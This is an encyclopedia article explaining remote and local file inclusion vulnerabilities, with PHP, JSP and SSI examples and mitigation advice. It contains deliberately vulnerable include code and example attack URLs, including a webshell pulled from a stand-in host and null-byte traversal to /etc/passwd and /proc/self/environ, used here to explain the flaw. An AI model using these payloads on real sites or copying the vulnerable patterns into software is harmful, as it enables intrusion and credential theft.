Types of Inclusion\[[edit](https://en.wikipedia.org/w/index.php?title=File_inclusion_vulnerability&action=edit&section=1 "Edit section: Types of Inclusion")\]
--------------------------------------------------------------------------------------------------------------------------------------------------------------

### Remote file inclusion\[[edit](https://en.wikipedia.org/w/index.php?title=File_inclusion_vulnerability&action=edit&section=2 "Edit section: Remote file inclusion")\]

**Remote file inclusion** (**RFI**) occurs when the web application downloads and executes a remote file. These remote files are usually obtained in the form of an [HTTP](https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol "Hypertext Transfer Protocol") or [FTP](https://en.wikipedia.org/wiki/File_Transfer_Protocol "File Transfer Protocol") [URI](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier "Uniform Resource Identifier") as a user-supplied parameter to the web application.

### Local file inclusion\[[edit](https://en.wikipedia.org/w/index.php?title=File_inclusion_vulnerability&action=edit&section=3 "Edit section: Local file inclusion")\]

**Local file inclusion** (**LFI**) is similar to a remote file inclusion vulnerability except instead of including remote files, only local files i.e. files on the current server can be included for execution. This issue can still lead to remote code execution by including a file that contains attacker-controlled data such as the web server's access logs.

Programming languages\[[edit](https://en.wikipedia.org/w/index.php?title=File_inclusion_vulnerability&action=edit&section=4 "Edit section: Programming languages")\]
--------------------------------------------------------------------------------------------------------------------------------------------------------------------

### PHP\[[edit](https://en.wikipedia.org/w/index.php?title=File_inclusion_vulnerability&action=edit&section=5 "Edit section: PHP")\]

In [PHP](https://en.wikipedia.org/wiki/PHP "PHP") the main cause is due to the use of unvalidated user-input with a filesystem function that includes a file for execution. Most notable are the `include` and `require` statements. Most of the vulnerabilities can be attributed to novice programmers not being familiar with all of the capabilities of the PHP programming language. The PHP language has a directive which, if enabled, allows filesystem functions to use a [URL](https://en.wikipedia.org/wiki/URL "URL") to retrieve data from remote locations.[\[1\]](https://en.wikipedia.org/wiki/File_inclusion_vulnerability#cite_note-remote-1) The directive is `allow_url_fopen` in PHP versions <= 4.3.4 and `allow_url_include` since PHP 5.2.0. In PHP 5.x this directive is disabled by default, in prior versions it was enabled by default.[\[2\]](https://en.wikipedia.org/wiki/File_inclusion_vulnerability#cite_note-2) To exploit the vulnerability an attacker will alter a variable that is passed to one of these functions to cause it to include malicious code from a remote resource. To mitigate this vulnerability all user input needs to be [validated](https://en.wikipedia.org/wiki/Data_validation "Data validation") before being used.[\[3\]](https://en.wikipedia.org/wiki/File_inclusion_vulnerability#cite_note-3)[\[4\]](https://en.wikipedia.org/wiki/File_inclusion_vulnerability#cite_note-4)

#### Example\[[edit](https://en.wikipedia.org/w/index.php?title=File_inclusion_vulnerability&action=edit&section=6 "Edit section: Example")\]

Consider this [PHP](https://en.wikipedia.org/wiki/PHP "PHP") script which includes a file specified by request:

<?php
if (isset($\_GET\['language'\])) {
    include($\_GET\['language'\] . '.php');
}
?>

<form method\="get"\>
   <select name\="language"\>
      <option value\="english"\>English</option\>
      <option value\="french"\>French</option\>
      ...
   </select\>
   <input type\="submit"\>
</form\>

The developer intended to read in `english.php` or `french.php`, which will alter the application's behavior to display the language of the user's choice. But it is possible to inject another path using the `language` parameter.

-   `/vulnerable.php?language=**http://evil.example.com/webshell.txt?**` \- injects a remotely hosted file containing a malicious code (remote file include)
-   `/vulnerable.php?language=**C:\\ftp\\upload\\exploit**` \- Executes code from an already uploaded file called `exploit.php` (local file inclusion vulnerability)
-   `/vulnerable.php?language=**C:\\notes.txt%00**` \- example using [NULL](https://en.wikipedia.org/wiki/Null_character "Null character") [meta character](https://en.wikipedia.org/wiki/Meta_character "Meta character") to remove the `.php` suffix, allowing access to files other than `.php`. This use of null byte injection was patched in PHP 5.3, and can no longer be used for LFI/RFI attacks.[\[5\]](https://en.wikipedia.org/wiki/File_inclusion_vulnerability#cite_note-5)
-   `/vulnerable.php?language=**../../../../../etc/passwd%00**` \- allows an attacker to read the contents of the `/etc/passwd` file on a [Unix-like](https://en.wikipedia.org/wiki/Unix-like "Unix-like") system through a [directory traversal attack](https://en.wikipedia.org/wiki/Directory_traversal_attack "Directory traversal attack").
-   `/vulnerable.php?language=**../../../../../proc/self/environ%00**` \- allows an attacker to read the contents of the `/proc/self/environ` file on a [Unix-like](https://en.wikipedia.org/wiki/Unix-like "Unix-like") system through a [directory traversal attack](https://en.wikipedia.org/wiki/Directory_traversal_attack "Directory traversal attack"). An attacker can modify a [HTTP](https://en.wikipedia.org/wiki/HTTP "HTTP") header (such as `User-Agent`) in this attack to be PHP code to exploit [remote code execution](https://en.wikipedia.org/wiki/Arbitrary_code_execution "Arbitrary code execution").

The best solution in this case is to use a whitelist of accepted language parameters. If a strong method of input validation such as a whitelist cannot be used, then rely upon input filtering or validation of the passed-in path to make sure it does not contain unintended characters and character patterns. However, this may require anticipating all possible problematic character combinations. A safer solution is to use a predefined Switch/Case statement to determine which file to include rather than use a URL or form parameter to dynamically generate the path.

### JavaServer Pages (JSP)\[[edit](https://en.wikipedia.org/w/index.php?title=File_inclusion_vulnerability&action=edit&section=7 "Edit section: JavaServer Pages (JSP)")\]

[JavaServer Pages](https://en.wikipedia.org/wiki/JavaServer_Pages "JavaServer Pages") (JSP) is a scripting language which can include files for execution at runtime.

#### Example\[[edit](https://en.wikipedia.org/w/index.php?title=File_inclusion_vulnerability&action=edit&section=8 "Edit section: Example")\]

The following script is vulnerable to a file inclusion vulnerability:

<%
   String p \= request.getParameter("p");
   @include file\="<%="includes/" + p +".jsp"%>"
%>

-   `/vulnerable.jsp?p=../../../../var/log/access.log%00` \- Unlike PHP, JSP is still affected by Null byte injection, and this param will execute JSP commands found in the web server's access log.

### Server Side Includes (SSI)\[[edit](https://en.wikipedia.org/w/index.php?title=File_inclusion_vulnerability&action=edit&section=9 "Edit section: Server Side Includes (SSI)")\]

A [Server Side Include](https://en.wikipedia.org/wiki/Server_Side_Includes "Server Side Includes") is very uncommon and are not typically enabled on a default web server. A server-side include can be used to gain remote code execution on a vulnerable web server.[\[6\]](https://en.wikipedia.org/wiki/File_inclusion_vulnerability#cite_note-6)

#### Example\[[edit](https://en.wikipedia.org/w/index.php?title=File_inclusion_vulnerability&action=edit&section=10 "Edit section: Example")\]

The following code is vulnerable to a remote-file inclusion vulnerability:

<!DOCTYPE html>
<html\>
<head\>
<title\>Test file</title\>
</head\>
<body\>
<!--#include file="USER\_LANGUAGE"-->
</body\>
</html\>

The above code is not an [XSS vulnerability](https://en.wikipedia.org/wiki/Cross-site_scripting "Cross-site scripting"), but rather including a new [file](https://en.wikipedia.org/wiki/Computer_file "Computer file") to be executed by the server.

See also\[[edit](https://en.wikipedia.org/w/index.php?title=File_inclusion_vulnerability&action=edit&section=11 "Edit section: See also")\]
-------------------------------------------------------------------------------------------------------------------------------------------

-   [Attack (computing)](https://en.wikipedia.org/wiki/Attack_(computing) "Attack (computing)")
-   [Code injection](https://en.wikipedia.org/wiki/Code_injection "Code injection")
-   [Metasploit Project](https://en.wikipedia.org/wiki/Metasploit_Project "Metasploit Project"), an open-source penetration testing tool that includes tests for RFI
-   [SQL injection](https://en.wikipedia.org/wiki/SQL_injection "SQL injection")
-   [Threat (computer)](https://en.wikipedia.org/wiki/Threat_(computer) "Threat (computer)")
-   [w3af](https://en.wikipedia.org/wiki/W3af "W3af"), an open-source [web application security scanner](https://en.wikipedia.org/wiki/Web_application_security_scanner "Web application security scanner")
-   [Default Credential vulnerability](https://en.wikipedia.org/wiki/Default_Credential_vulnerability "Default Credential vulnerability")

References\[[edit](https://en.wikipedia.org/w/index.php?title=File_inclusion_vulnerability&action=edit&section=12 "Edit section: References")\]
-----------------------------------------------------------------------------------------------------------------------------------------------

1.  **[^](https://en.wikipedia.org/wiki/File_inclusion_vulnerability#cite_ref-remote_1-0 "Jump up")** ["Using remote files"](http://www.php.net/manual/en/features.remote-files.php). PHP. Retrieved March 3, 2013.
2.  **[^](https://en.wikipedia.org/wiki/File_inclusion_vulnerability#cite_ref-2 "Jump up")** ["List of php.ini directives"](http://php.net/manual/en/ini.list.php). PHP. Retrieved October 21, 2016.
3.  **[^](https://en.wikipedia.org/wiki/File_inclusion_vulnerability#cite_ref-3 "Jump up")** ["Remote File Inclusion"](http://projects.webappsec.org/Remote-File-Inclusion). The Web Application Security Consortium. Retrieved March 3, 2013.
4.  **[^](https://en.wikipedia.org/wiki/File_inclusion_vulnerability#cite_ref-4 "Jump up")** ["CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program ('PHP Remote File Inclusion')"](http://cwe.mitre.org/data/definitions/98.html). _Common Weakness Enumeration (CWE)_. Mitre. Retrieved March 3, 2013.
5.  **[^](https://en.wikipedia.org/wiki/File_inclusion_vulnerability#cite_ref-5 "Jump up")** ["PHP :: Request #39863 :: file\_exists() silently truncates after a null byte"](https://bugs.php.net/bug.php?id=39863). _bugs.php.net_. Retrieved 2016-10-21.
6.  **[^](https://en.wikipedia.org/wiki/File_inclusion_vulnerability#cite_ref-6 "Jump up")** ["Apache httpd Tutorial: Introduction to Server Side Includes - Apache HTTP Server Version 2.4"](http://httpd.apache.org/docs/current/howto/ssi.html#exec). _httpd.apache.org_. Retrieved 2016-10-21.

External links\[[edit](https://en.wikipedia.org/w/index.php?title=File_inclusion_vulnerability&action=edit&section=13 "Edit section: External links")\]
-------------------------------------------------------------------------------------------------------------------------------------------------------

-   [Remote File Inclusion](http://projects.webappsec.org/Remote-File-Inclusion) at the Web Application Security Consortium
-   [Local File Inclusion](https://blog.detectify.com/post/33582910583/the-basics-of-local-file-inclusions)
-   [Local & Remove File Inclusion WordPress](https://secure.wphackedhelp.com/blog/remote-local-file-inclusion-vulnerability/) at WP Hacked Help